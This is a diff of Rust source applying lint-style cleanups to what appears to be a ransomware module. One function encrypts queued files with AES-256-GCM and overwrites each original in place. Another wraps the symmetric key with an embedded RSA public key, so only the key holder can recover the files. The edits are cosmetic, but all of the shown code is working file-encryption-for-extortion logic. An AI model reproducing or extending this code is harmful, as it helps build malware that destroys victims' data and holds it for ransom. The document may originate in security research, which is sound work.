@@ -12,7 +12,7 @@ use crate::PUB_KEY;
 
 /// generates a key using `openssl::rand::rand_bytes()` method
 pub(crate) fn generate_key() -> Vec<u8> {
-    let mut key = vec![0 as u8; 32];
+    let mut key = vec![0_u8; 32];
     rand_bytes(&mut key).unwrap();
     key
 }
@@ -20,7 +20,7 @@ pub(crate) fn generate_key() -> Vec<u8> {
 /// encrypts files from the `r` reciever using the provided `key`. Exits when it runs out of files to encrypt.
 pub(crate) async fn encrypt_files(r: Receiver<DirEntry>, mut key: Vec<u8>) {
     event!(Level::DEBUG, "Encryption worker started.");
-    while r.len() != 0 {
+    while !r.is_empty() {
         if let Ok(file) = r.recv() {
             event!(Level::DEBUG, "Processing file: {:?}", file);
             let content = read(file.path());
@@ -33,7 +33,7 @@ pub(crate) async fn encrypt_files(r: Receiver<DirEntry>, mut key: Vec<u8>) {
                 Cipher::aes_256_gcm(),
                 &key,
                 Some(&iv),
-                &content.as_ref().unwrap(),
+                content.as_ref().unwrap(),
             ) {
                 output.append(&mut iv);
                 let _ = write(file.path(), &output);
@@ -50,6 +50,7 @@ pub(crate) async fn encrypt_files(r: Receiver<DirEntry>, mut key: Vec<u8>) {
 }
 
 /// wraps a key using the embedded `PUB_KEY` value
+#[allow(clippy::ptr_arg)]
 pub(crate) fn wrap_key(key: &Vec<u8>) -> Vec<u8> {
     // import key
     let rsa_key = rsa::Rsa::public_key_from_pem(PUB_KEY).unwrap();
@@ -57,10 +58,10 @@ pub(crate) fn wrap_key(key: &Vec<u8>) -> Vec<u8> {
 
     // find output size and pre-allocate buffer
     let encryptor = openssl::encrypt::Encrypter::new(&p_key).unwrap();
-    let buffer_len = encryptor.encrypt_len(&key).unwrap();
+    let buffer_len = encryptor.encrypt_len(key).unwrap();
     let mut encrypted = vec![0u8; buffer_len];
 
     // Encrypt the data and discard its length. Return buffer.
-    let _ = encryptor.encrypt(&key, &mut encrypted).unwrap();
-    return encrypted;
+    let _ = encryptor.encrypt(key, &mut encrypted).unwrap();
+    encrypted
 }
